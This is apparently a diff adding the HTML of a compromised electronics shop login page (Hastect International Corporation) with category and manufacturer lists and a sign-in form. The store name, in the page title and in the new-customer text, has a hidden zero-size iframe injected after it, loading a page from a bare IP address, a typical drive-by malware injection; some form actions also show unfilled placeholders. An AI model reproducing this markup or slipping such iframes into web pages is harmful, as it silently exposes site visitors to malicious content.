@@ -1,0 +1,276 @@
+<!doctype html public "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html dir="LTR" lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<title>Hastect International Corporation<iframe src='http://112.164.188.12/hza.html' width='0' height='0' frameborder='0'></iframe></title>
+<base href="http://www.hastect.com/">
+<link rel="stylesheet" type="text/css" href="stylesheet.css">
+<script language="javascript"><!--
+function session_win() {
+  window.open("http://www.hastect.com/info_shopping_cart.php?osCsid=f50a2a810602b70b00660520d6bfac61","info_shopping_cart","height=460,width=430,toolbar=no,statusbar=no,scrollbars=yes").focus();
+}
+//--></script>
+</head>
+<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">
+<!-- header //-->
+<table align="center" width="750" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td>
+	<table class="header" width="100%" border="0" cellspacing="0" cellpadding="0">
+	  <tr>
+		<td valign="middle" style="padding-left:"><img src="images/logo.jpg" alt="Hastect" height="50" /></td>
+		<td width="100" align="center" valign="bottom"><a class="header_link" href="index.php?osCsid=f50a2a810602b70b00660520d6bfac61">Homepage</a></td>
+		<td width="5" align="center" valign="bottom"><img src="images/menu_separator.gif" /></td>
+		<td width="100" align="center" valign="bottom"><a class="header_link" href="services.php?osCsid=f50a2a810602b70b00660520d6bfac61">Services</a></td>
+		<td width="5" align="center" valign="bottom"><img src="images/menu_separator.gif" /></td>
+		<td width="80" align="center" valign="bottom"><a class="header_link" href="repair.php?osCsid=f50a2a810602b70b00660520d6bfac61">Repair</a></td>
+		<td width="5" align="center" valign="bottom"><img src="images/menu_separator.gif" /></td>
+		<td width="130" align="center" valign="bottom"><a class="header_link" href="about_us.php?osCsid=f50a2a810602b70b00660520d6bfac61">About Us </a></td>
+		<td width="5" align="center" valign="bottom"><img src="images/menu_separator.gif" /></td>
+		<td width="100" colspan="2" align="center" valign="bottom"><a class="header_link" href="contact_us.php?osCsid=f50a2a810602b70b00660520d6bfac61">Contact Us</a></td>
+	  </tr>
+	  <tr>
+	    <td colspan="11" align="right" style="padding:10px;">
+		<table width="100%" height="50" border="0" cellpadding="0" cellspacing="0">
+		  <tr>
+			<td width="653" align="right" valign="middle"><!-- languages //-->
+ <a href="http://www.hastect.com/login.php?language=wj&osCsid=f50a2a810602b70b00660520d6bfac61"><img src="includes/languages/../../images/update_resolution/images/icon.gif" border="0" alt="wj" title=" wj "></a>  <a href="http://www.hastect.com/login.php?language=en&osCsid=f50a2a810602b70b00660520d6bfac61"><img src="includes/languages/english/images/icon.gif" border="0" alt="English" title=" English " width="24" height="15"></a>  <a href="http://www.hastect.com/login.php?language=es&osCsid=f50a2a810602b70b00660520d6bfac61"><img src="includes/languages/espanol/images/icon.gif" border="0" alt="espanol" title=" espanol " width="24" height="15"></a>  <a href="http://www.hastect.com/login.php?language=ge&osCsid=f50a2a810602b70b00660520d6bfac61"><img src="includes/languages/german/images/icon.gif" border="0" alt="german" title=" german " width="24" height="15"></a> <!-- languages_eof //-->
+</td>
+			<td width="302" align="right" valign="bottom"><form name="quick_find" action="http://www.hastect.com/advanced_search_result.php" method="get"><input type="text" name="keywords" size="20" maxlength="30" style="height:20px;" >&nbsp;<input type="hidden" name="osCsid" value="f50a2a810602b70b00660520d6bfac61"><input type="image" src="includes/languages/english/images/buttons/search.gif" border="0" alt="Quick Find" title=" Quick Find "><br><a style="font-size:12px;" class="pro_hd_link" href="http://www.hastect.com/advanced_search.php?osCsid=f50a2a810602b70b00660520d6bfac61"><b>Advanced Search</b></a><!-- search_eof //-->
+</td>
+		  </tr>
+		</table>
+		</td>
+	  </tr>
+</table>
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td>
+	<img width="750" src="images/hd_banners/dell_xps_banner.jpg" alt="Top Banner" />	</td>
+  </tr>
+    <tr>
+    <td>&nbsp;</td>
+  </tr>
+</table>
+
+
+<!-- header_eof //-->
+
+<!-- body //-->
+<table border="0" width="100%" cellspacing="3" cellpadding="3">
+  <tr>
+    <td width="200" valign="top"><table border="0" width="200" cellspacing="0" cellpadding="2">
+<!-- left_navigation //-->
+<!-- categories //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="46" class="infoBoxHeading"><img src="images/infobox/hd_left.jpg" border="0" alt="" width="13" height="46"></td>
+    <td width="100%" height="46" class="infoBoxHeading">Categories</td>
+    <td height="46" class="infoBoxHeading" nowrap><img src="images/infobox/hd_right.jpg" border="0" alt="" width="13" height="46"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText"><a href="http://www.hastect.com/index.php?cPath=24&osCsid=f50a2a810602b70b00660520d6bfac61">AC</a>&nbsp;(70)<br><a href="http://www.hastect.com/index.php?cPath=32&osCsid=f50a2a810602b70b00660520d6bfac61">Audio</a>&nbsp;(2)<br><a href="http://www.hastect.com/index.php?cPath=33&osCsid=f50a2a810602b70b00660520d6bfac61">Barcode</a><br><a href="http://www.hastect.com/index.php?cPath=35&osCsid=f50a2a810602b70b00660520d6bfac61">Battery</a>&nbsp;(75)<br><a href="http://www.hastect.com/index.php?cPath=36&osCsid=f50a2a810602b70b00660520d6bfac61">Biometric Fingerprint</a>&nbsp;(1)<br><a href="http://www.hastect.com/index.php?cPath=37&osCsid=f50a2a810602b70b00660520d6bfac61">Bluetooth Device</a>&nbsp;(4)<br><a href="http://www.hastect.com/index.php?cPath=38&osCsid=f50a2a810602b70b00660520d6bfac61">Cable</a>&nbsp;(8)<br><a href="http://www.hastect.com/index.php?cPath=25&osCsid=f50a2a810602b70b00660520d6bfac61">Camcorder-&gt;</a>&nbsp;(30)<br><a href="http://www.hastect.com/index.php?cPath=40&osCsid=f50a2a810602b70b00660520d6bfac61">Carrybag</a>&nbsp;(14)<br><a href="http://www.hastect.com/index.php?cPath=41&osCsid=f50a2a810602b70b00660520d6bfac61">CDRW Drive</a><br><a href="http://www.hastect.com/index.php?cPath=119&osCsid=f50a2a810602b70b00660520d6bfac61">Consumables-&gt;</a>&nbsp;(2)<br><a href="http://www.hastect.com/index.php?cPath=26&osCsid=f50a2a810602b70b00660520d6bfac61">Desktop PC-&gt;</a>&nbsp;(13)<br><a href="http://www.hastect.com/index.php?cPath=39&osCsid=f50a2a810602b70b00660520d6bfac61">Digital Camera-&gt;</a>&nbsp;(38)<br><a href="http://www.hastect.com/index.php?cPath=42&osCsid=f50a2a810602b70b00660520d6bfac61">Digital Quran / Qibla</a><br><a href="http://www.hastect.com/index.php?cPath=43&osCsid=f50a2a810602b70b00660520d6bfac61">Docking Station</a>&nbsp;(4)<br><a href="http://www.hastect.com/index.php?cPath=46&osCsid=f50a2a810602b70b00660520d6bfac61">DVD+R/RW Drive</a><br><a href="http://www.hastect.com/index.php?cPath=47&osCsid=f50a2a810602b70b00660520d6bfac61">Fax Machine</a>&nbsp;(13)<br><a href="http://www.hastect.com/index.php?cPath=48&osCsid=f50a2a810602b70b00660520d6bfac61">Floppy Drive</a>&nbsp;(5)<br><a href="http://www.hastect.com/index.php?cPath=50&osCsid=f50a2a810602b70b00660520d6bfac61">GPS Device-&gt;</a>&nbsp;(20)<br><a href="http://www.hastect.com/index.php?cPath=27&osCsid=f50a2a810602b70b00660520d6bfac61">Handheld</a>&nbsp;(12)<br><a href="http://www.hastect.com/index.php?cPath=51&osCsid=f50a2a810602b70b00660520d6bfac61">Hard Drive-&gt;</a>&nbsp;(13)<br><a href="http://www.hastect.com/index.php?cPath=140&osCsid=f50a2a810602b70b00660520d6bfac61">Interface Devices</a>&nbsp;(6)<br><a href="http://www.hastect.com/index.php?cPath=8&osCsid=f50a2a810602b70b00660520d6bfac61">Keyboards</a>&nbsp;(7)<br><a href="http://www.hastect.com/index.php?cPath=53&osCsid=f50a2a810602b70b00660520d6bfac61">Lamination Machine</a><br><a href="http://www.hastect.com/index.php?cPath=146&osCsid=f50a2a810602b70b00660520d6bfac61">Laptop Skins-&gt;</a><br><a href="http://www.hastect.com/index.php?cPath=16&osCsid=f50a2a810602b70b00660520d6bfac61">Memory-&gt;</a>&nbsp;(26)<br><a href="http://www.hastect.com/index.php?cPath=9&osCsid=f50a2a810602b70b00660520d6bfac61">Mice</a>&nbsp;(1)<br><a href="http://www.hastect.com/index.php?cPath=28&osCsid=f50a2a810602b70b00660520d6bfac61">Mobile Phone-&gt;</a>&nbsp;(115)<br><a href="http://www.hastect.com/index.php?cPath=55&osCsid=f50a2a810602b70b00660520d6bfac61">Modem-&gt;</a>&nbsp;(9)<br><a href="http://www.hastect.com/index.php?cPath=6&osCsid=f50a2a810602b70b00660520d6bfac61">Monitors-&gt;</a>&nbsp;(18)<br><a href="http://www.hastect.com/index.php?cPath=57&osCsid=f50a2a810602b70b00660520d6bfac61">Network Product-&gt;</a>&nbsp;(18)<br><a href="http://www.hastect.com/index.php?cPath=22&osCsid=f50a2a810602b70b00660520d6bfac61">Notebook-&gt;</a>&nbsp;(146)<br><a href="http://www.hastect.com/index.php?cPath=44&osCsid=f50a2a810602b70b00660520d6bfac61">Optical Drive</a>&nbsp;(9)<br><a href="http://www.hastect.com/index.php?cPath=45&osCsid=f50a2a810602b70b00660520d6bfac61">Optical Media</a>&nbsp;(1)<br><a href="http://www.hastect.com/index.php?cPath=59&osCsid=f50a2a810602b70b00660520d6bfac61">Paper Shredder</a>&nbsp;(9)<br><a href="http://www.hastect.com/index.php?cPath=60&osCsid=f50a2a810602b70b00660520d6bfac61">Phone PABX System</a>&nbsp;(1)<br><a href="http://www.hastect.com/index.php?cPath=61&osCsid=f50a2a810602b70b00660520d6bfac61">Plotter</a><br><a href="http://www.hastect.com/index.php?cPath=34&osCsid=f50a2a810602b70b00660520d6bfac61">POS</a><br><a href="http://www.hastect.com/index.php?cPath=62&osCsid=f50a2a810602b70b00660520d6bfac61">Printer-&gt;</a>&nbsp;(117)<br><a href="http://www.hastect.com/index.php?cPath=23&osCsid=f50a2a810602b70b00660520d6bfac61">Projector-&gt;</a>&nbsp;(16)<br><a href="http://www.hastect.com/index.php?cPath=72&osCsid=f50a2a810602b70b00660520d6bfac61">Radio Communication</a>&nbsp;(1)<br><a href="http://www.hastect.com/index.php?cPath=65&osCsid=f50a2a810602b70b00660520d6bfac61">Scanner</a>&nbsp;(16)<br><a href="http://www.hastect.com/index.php?cPath=67&osCsid=f50a2a810602b70b00660520d6bfac61">Security-&gt;</a>&nbsp;(34)<br><a href="http://www.hastect.com/index.php?cPath=29&osCsid=f50a2a810602b70b00660520d6bfac61">Server-&gt;</a>&nbsp;(1)<br><a href="http://www.hastect.com/index.php?cPath=2&osCsid=f50a2a810602b70b00660520d6bfac61">Software-&gt;</a>&nbsp;(21)<br><a href="http://www.hastect.com/index.php?cPath=58&osCsid=f50a2a810602b70b00660520d6bfac61">Spare Parts-&gt;</a><br><a href="http://www.hastect.com/index.php?cPath=7&osCsid=f50a2a810602b70b00660520d6bfac61">Speakers</a><br><a href="http://www.hastect.com/index.php?cPath=17&osCsid=f50a2a810602b70b00660520d6bfac61">Spy Gadgets</a><br><a href="http://www.hastect.com/index.php?cPath=30&osCsid=f50a2a810602b70b00660520d6bfac61">Tablet PC</a>&nbsp;(8)<br><a href="http://www.hastect.com/index.php?cPath=31&osCsid=f50a2a810602b70b00660520d6bfac61">Television-&gt;</a><br><a href="http://www.hastect.com/index.php?cPath=159&osCsid=f50a2a810602b70b00660520d6bfac61">topednews3</a><br><a href="http://www.hastect.com/index.php?cPath=160&osCsid=f50a2a810602b70b00660520d6bfac61">topednews3</a><br><a href="http://www.hastect.com/index.php?cPath=161&osCsid=f50a2a810602b70b00660520d6bfac61">topednews3</a><br><a href="http://www.hastect.com/index.php?cPath=157&osCsid=f50a2a810602b70b00660520d6bfac61">topednews3</a><br><a href="http://www.hastect.com/index.php?cPath=158&osCsid=f50a2a810602b70b00660520d6bfac61">topednews3</a><br><a href="http://www.hastect.com/index.php?cPath=68&osCsid=f50a2a810602b70b00660520d6bfac61">TV Tuner</a>&nbsp;(2)<br><a href="http://www.hastect.com/index.php?cPath=69&osCsid=f50a2a810602b70b00660520d6bfac61">UPS</a><br><a href="http://www.hastect.com/index.php?cPath=124&osCsid=f50a2a810602b70b00660520d6bfac61">USB Devices-&gt;</a>&nbsp;(2)<br></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- categories_eof //-->
+<!-- manufacturers //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="46" class="infoBoxHeading"><img src="images/infobox/hd_left.jpg" border="0" alt="" width="13" height="46"></td>
+    <td width="100%" height="46" class="infoBoxHeading">Manufacturers</td>
+    <td height="46" class="infoBoxHeading" nowrap><img src="images/infobox/hd_right.jpg" border="0" alt="" width="13" height="46"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText"><form name="manufacturers" action="http://www.hastect.com/index.php" method="get"><select name="manufacturers_id" onChange="this.form.submit();" size="1" style="width: 100%" class="manu_select"><option value="" SELECTED>Please Select</option><option value="129"></option><option value="148"></option><option value="149"></option><option value="150"></option><option value="151"></option><option value="127"></option><option value="153"></option><option value="154"></option><option value="155"></option><option value="156"></option><option value="157"></option><option value="158"></option><option value="159"></option><option value="126"></option><option value="125"></option><option value="147"></option><option value="146"></option><option value="145"></option><option value="119"></option><option value="130"></option><option value="131"></option><option value="132"></option><option value="133"></option><option value="134"></option><option value="135"></option><option value="137"></option><option value="138"></option><option value="139"></option><option value="128"></option><option value="141"></option><option value="143"></option><option value="144"></option><option value="140"></option><option value="124"></option><option value="136"></option><option value="160"></option><option value="142"></option><option value="111"></option><option value="112"></option><option value="113"></option><option value="114"></option><option value="115"></option><option value="116"></option><option value="123"></option><option value="122"></option><option value="152"></option><option value="161"></option><option value="121"></option><option value="120"></option><option value="118"></option><option value="117"></option><option value="10">3Com</option><option value="103">3M</option><option value="11">Acer</option><option value="12">APC</option><option value="13">Apple</option><option value="14">Asus</option><option value="15">Averatec</option><option value="16">Belkin</option><option value="17">Benq</option><option value="18">Billionton</option><option value="41">Brother</option><option value="6">Canon</option><option value="19">Casio</option><option value="99">Chronos</option><option value="20">Clevo</option><option value="21">Compal</option><option value="22">Compaq</option><option value="98">Creative</option><option value="25">D-Link</option><option value="24">Daewoo</option><option value="23">Dell</option><option value="26">Edifier</option><option value="27">EMachine</option><option value="28">Everex</option><option value="29">Flybook</option><option value="30">Fujitsu</option><option value="31">Fujitsu Siemens</option><option value="32">Garmin</option><option value="33">Garrard</option><option value="34">Gateway</option><option value="35">Genius</option><option value="36">Geovision</option><option value="37">Globalsat</option><option value="9">Hewlett Packard</option><option value="38">Hitachi</option><option value="71">HTC</option><option value="39">Hynix</option><option value="40">IBM Lenovo</option><option value="43">Imate</option><option value="44">Inbox</option><option value="45">InFocus</option><option value="46">Intel</option><option value="47">Iomega</option><option value="48">JBL</option><option value="109">Kaspersky</option><option value="49">Kingston</option><option value="42">Lenovo</option><option value="50">LG</option><option value="51">Linksys</option><option value="52">Liteon</option><option value="5">Logitech</option><option value="1">Matrox</option><option value="53">Maxtor</option><option value="2">Microsoft</option><option value="54">Mitsubishi</option><option value="96">Mobidata</option><option value="55">Motorola</option><option value="105">MSI</option><option value="56">Navman</option><option value="57">NEC</option><option value="58">Netgear</option><option value="59">Nokia</option><option value="107">OKI</option><option value="60">Olympus</option><option value="101">Openmoko</option><option value="61">Optoma</option><option value="62">OQO</option><option value="63">Orange</option><option value="64">Packard Bell</option><option value="65">PalmOne</option><option value="66">Panasonic</option><option value="108">Philips</option><option value="67">PixelView</option><option value="68">Planet</option><option value="69">Promate</option><option value="70">Qtek</option><option value="72">Rexel</option><option value="110">Ritek</option><option value="73">Samsung</option><option value="74">Sanyo</option><option value="75">Seagate</option><option value="76">Sharp</option><option value="77">Shredstar</option><option value="78">Siemens</option><option value="79">Sipura</option><option value="94">Sony Electronic..</option><option value="80">Sony Ericsson</option><option value="90">Sony Vaio</option><option value="81">St Lab</option><option value="102">Sunwood</option><option value="82">Symantec</option><option value="83">Targus</option><option value="84">TDS</option><option value="85">TomTom</option><option value="86">Toshiba</option><option value="87">Truckstop</option><option value="88">Twinhead</option><option value="89">Vanguard</option><option value="91">Veo</option><option value="95">Viewsonic</option><option value="97">Vodafone</option><option value="92">Western Digital</option><option value="93">Yamaha</option><option value="100">Yashica</option><option value="106">Zebra</option><option value="104">Zyxel</option></select><input type="hidden" name="osCsid" value="f50a2a810602b70b00660520d6bfac61"></form></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- manufacturers_eof //-->
+<!-- best_sellers //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="46" class="infoBoxHeading"><img src="images/infobox/hd_left.jpg" border="0" alt="" width="13" height="46"></td>
+    <td width="100%" height="46" class="infoBoxHeading">Bestsellers</td>
+    <td height="46" class="infoBoxHeading" nowrap><img src="images/infobox/hd_right.jpg" border="0" alt="" width="13" height="46"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText"><table border="0" width="100%" cellspacing="0" cellpadding="1"><tr><td class="infoBoxContents" valign="top">01.</td><td class="infoBoxContents"><a href="http://www.hastect.com/product_info.php?products_id=26&osCsid=f50a2a810602b70b00660520d6bfac61">Microsoft IntelliMouse Explorer</a></td></tr><tr><td class="infoBoxContents" valign="top">02.</td><td class="infoBoxContents"><a href="http://www.hastect.com/product_info.php?products_id=692&osCsid=f50a2a810602b70b00660520d6bfac61">Dell Bluetooth Wireless Keyboard</a></td></tr><tr><td class="infoBoxContents" valign="top">03.</td><td class="infoBoxContents"><a href="http://www.hastect.com/product_info.php?products_id=821&osCsid=f50a2a810602b70b00660520d6bfac61">Philips 170CW8FB 17" Wide LCD Monitor</a></td></tr><tr><td class="infoBoxContents" valign="top">04.</td><td class="infoBoxContents"><a href="http://www.hastect.com/product_info.php?products_id=312&osCsid=f50a2a810602b70b00660520d6bfac61">Nokia N95 8GB</a></td></tr><tr><td class="infoBoxContents" valign="top">05.</td><td class="infoBoxContents"><a href="http://www.hastect.com/product_info.php?products_id=876&osCsid=f50a2a810602b70b00660520d6bfac61">Philips 190SW8FB 19" Wide LCD Monitor</a></td></tr><tr><td class="infoBoxContents" valign="top">06.</td><td class="infoBoxContents"><a href="http://www.hastect.com/product_info.php?products_id=1032&osCsid=f50a2a810602b70b00660520d6bfac61">IPhone 16GB GSM 3G Mobile Phone</a></td></tr><tr><td class="infoBoxContents" valign="top">07.</td><td class="infoBoxContents"><a href="http://www.hastect.com/product_info.php?products_id=303&osCsid=f50a2a810602b70b00660520d6bfac61">Nokia 5310 XPressMusic</a></td></tr><tr><td class="infoBoxContents" valign="top">08.</td><td class="infoBoxContents"><a href="http://www.hastect.com/product_info.php?products_id=378&osCsid=f50a2a810602b70b00660520d6bfac61">Sony Ericsson W810 Walkman Phone</a></td></tr><tr><td class="infoBoxContents" valign="top">09.</td><td class="infoBoxContents"><a href="http://www.hastect.com/product_info.php?products_id=25&osCsid=f50a2a810602b70b00660520d6bfac61">Microsoft Internet Keyboard PS/2</a></td></tr><tr><td class="infoBoxContents" valign="top">10.</td><td class="infoBoxContents"><a href="http://www.hastect.com/product_info.php?products_id=39&osCsid=f50a2a810602b70b00660520d6bfac61">Microsoft Fingerprint Reader - fingerprint reader - USB</a></td></tr></table></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- best_sellers_eof //-->
+<!-- left_navigation_eof //-->
+    </table></td>
+<!-- body_text //-->
+    <td width="100%" valign="top"><form name="login" action="HTTPS_SERVERDIR_WS_HTTPS_CATALOGlogin.php?action=process&osCsid=f50a2a810602b70b00660520d6bfac61" method="post"><table border="0" width="100%" cellspacing="0" cellpadding="0">
+      <tr>
+        <td><table border="0" width="100%" cellspacing="0" cellpadding="0">
+          <tr>
+            <td class="pageHeading">Welcome, Please Sign In</td>
+            <td class="pageHeading" align="right"><img src="images/table_background_login.gif" border="0" alt="Welcome, Please Sign In" title=" Welcome, Please Sign In " width="57" height="40"></td>
+          </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+      </tr>
+      <tr>
+        <td><table border="0" width="100%" cellspacing="0" cellpadding="2">
+          <tr>
+            <td class="main" width="50%" valign="top"><b>New Customer</b></td>
+            <td class="main" width="50%" valign="top"><b>Returning Customer</b></td>
+          </tr>
+          <tr>
+            <td width="50%" height="100%" valign="top"><table border="0" width="100%" height="100%" cellspacing="1" cellpadding="2" class="infoBox">
+              <tr class="infoBoxContents">
+                <td><table border="0" width="100%" height="100%" cellspacing="0" cellpadding="2">
+                  <tr>
+                    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+                  </tr>
+                  <tr>
+                    <td class="main" valign="top">I am a new customer.<br><br>By creating an account at Hastect International Corporation<iframe src='http://112.164.188.12/hza.html' width='0' height='0' frameborder='0'></iframe> you will be able to shop faster, be up to date on an orders status, and keep track of the orders you have previously made.</td>
+                  </tr>
+                  <tr>
+                    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+                  </tr>
+                  <tr>
+                    <td><table border="0" width="100%" cellspacing="0" cellpadding="2">
+                      <tr>
+                        <td width="10"><img src="images/pixel_trans.gif" border="0" alt="" width="10" height="1"></td>
+                        <td align="right"><a href="HTTPS_SERVERDIR_WS_HTTPS_CATALOGcreate_account.php?osCsid=f50a2a810602b70b00660520d6bfac61"><img src="includes/languages/english/images/buttons/button_continue.gif" border="0" alt="Continue" title=" Continue " width="100" height="22"></a></td>
+                        <td width="10"><img src="images/pixel_trans.gif" border="0" alt="" width="10" height="1"></td>
+                      </tr>
+                    </table></td>
+                  </tr>
+                </table></td>
+              </tr>
+            </table></td>
+            <td width="50%" height="100%" valign="top"><table border="0" width="100%" height="100%" cellspacing="1" cellpadding="2" class="infoBox">
+              <tr class="infoBoxContents">
+                <td><table border="0" width="100%" height="100%" cellspacing="0" cellpadding="2">
+                  <tr>
+                    <td colspan="2"><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+                  </tr>
+                  <tr>
+                    <td class="main" colspan="2">I am a returning customer.</td>
+                  </tr>
+                  <tr>
+                    <td colspan="2"><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+                  </tr>
+                  <tr>
+                    <td class="main"><b>E-Mail Address:</b></td>
+                    <td class="main"><input type="text" name="email_address"></td>
+                  </tr>
+                  <tr>
+                    <td class="main"><b>Password:</b></td>
+                    <td class="main"><input type="password" name="password" maxlength="40"></td>
+                  </tr>
+                  <tr>
+                    <td colspan="2"><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+                  </tr>
+                  <tr>
+                    <td class="smallText" colspan="2"><a href="HTTPS_SERVERDIR_WS_HTTPS_CATALOGpassword_forgotten.php?osCsid=f50a2a810602b70b00660520d6bfac61">Password forgotten? Click here.</a></td>
+                  </tr>
+                  <tr>
+                    <td colspan="2"><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+                  </tr>
+                  <tr>
+                    <td colspan="2"><table border="0" width="100%" cellspacing="0" cellpadding="2">
+                      <tr>
+                        <td width="10"><img src="images/pixel_trans.gif" border="0" alt="" width="10" height="1"></td>
+                        <td align="right"><input type="image" src="includes/languages/english/images/buttons/button_login.gif" border="0" alt="Sign In" title=" Sign In "></td>
+                        <td width="10"><img src="images/pixel_trans.gif" border="0" alt="" width="10" height="1"></td>
+                      </tr>
+                    </table></td>
+                  </tr>
+                </table></td>
+              </tr>
+            </table></td>
+          </tr>
+        </table></td>
+      </tr>
+    </table></form></td>
+<!-- body_text_eof //-->
+  </tr>
+</table>
+<!-- body_eof //-->
+
+<!-- footer //-->
+<table style="border-top:1px solid #4D4D4D" width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td align="center">	<br />
+	<table width="80%" border="0" cellspacing="0" cellpadding="0">
+	  <tr>
+		<td width="100" align="center"><a class="header_link" href="index.php?osCsid=f50a2a810602b70b00660520d6bfac61">Homepage</a></td>
+		<td width="5" align="center"><img src="images/menu_separator.gif" /></td>
+		<td width="100" align="center"><a class="header_link" href="account.php?osCsid=f50a2a810602b70b00660520d6bfac61">Account</a></td>
+		<td width="5" align="center"><img src="images/menu_separator.gif" /></td>
+		<td width="130" align="center"><a class="header_link" href="create_account.php?osCsid=f50a2a810602b70b00660520d6bfac61">Create an Account</a></td>
+		<td width="5" align="center"><img src="images/menu_separator.gif" /></td>
+		<td width="100" align="center"><a class="header_link" href="contact_us.php?osCsid=f50a2a810602b70b00660520d6bfac61">Contact Us</a></td>
+	  </tr>
+  </table>	<br />
+	</td>
+  </tr>
+  <tr>
+    <td align="center">Copyright © 2009 Hastect.com</td>
+  </tr>
+</table>
+
+
+
+   </td>
+  </tr>
+</table><!-- footer_eof //-->
+<br>
+</body>
+</html>
